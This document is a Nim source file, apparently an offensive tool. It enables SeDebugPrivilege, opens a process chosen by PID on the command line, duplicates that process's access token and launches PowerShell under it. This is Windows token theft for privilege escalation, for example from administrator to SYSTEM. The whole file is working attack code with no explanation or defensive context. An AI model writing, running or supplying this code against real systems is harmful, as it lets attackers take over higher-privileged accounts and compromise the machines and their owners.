import winim/inc/windef
import winim/inc/winbase
import winim/lean
import os
import strutils

var luid : LUID
var tp : TOKEN_PRIVILEGES

var privilegeName = L"SeDebugPrivilege"
var x = LookupPrivilegeValue(NULL, &privilegeName, &luid)

if not x == True:
    echo "Failed to get privilege name: ", GetLastError(), luid
    system.quit(1)

tp.PrivilegeCount = 1
tp.Privileges[0].Luid = luid
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

var h = GetCurrentProcess()

var accessToken : HANDLE

OpenProcessToken(h, TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, &accessToken)

var cb : DWORD = (DWORD) sizeof(TOKEN_PRIVILEGES)
x = AdjustTokenPrivileges(accessToken, FALSE, &tp, cb, NULL, NULL)

if not x == True:
    echo "Failed to adjust token privilege: ", GetLastError()
    system.quit(1)

if (GetLastError() == ERROR_NOT_ALL_ASSIGNED):
    echo "The token does not have the specified privilege"

var targetProcessId = (DWORD) parseInt(paramStr(1))
var handleSystemProcess : HANDLE = OpenProcess(PROCESS_QUERY_INFORMATION, True, targetProcessId)
x = GetLastError()

if x != 0:
    echo "OpenProcess failed with error: ", x

if handleSystemProcess == 0:
    echo "System process is null"

var tokenHandle : HANDLE;
x = OpenProcessToken(handleSystemProcess, TOKEN_ASSIGN_PRIMARY or TOKEN_DUPLICATE or TOKEN_IMPERSONATE or TOKEN_QUERY, &tokenHandle)

if x == 0 or x == ERROR_NOACCESS:
    echo "Failed getting process token. Error n. ", GetLastError()

var handleNewToken : HANDLE
x = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, securityImpersonation, tokenPrimary, &handleNewToken)
var y = GetLastError()

if x == 0 or y == ERROR_BAD_IMPERSONATION_LEVEL:
    echo "Function DuplicateTokenEx failed. Error n. ", y

var pi : PROCESS_INFORMATION
var si : STARTUPINFO
x = CreateProcessWithTokenW(handleNewToken, LOGON_NETCREDENTIALS_ONLY, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, si, &pi)
y = GetLastError()

if x == 0:
    echo "Function CreateProcessWithTokenW failed. Error n. ", y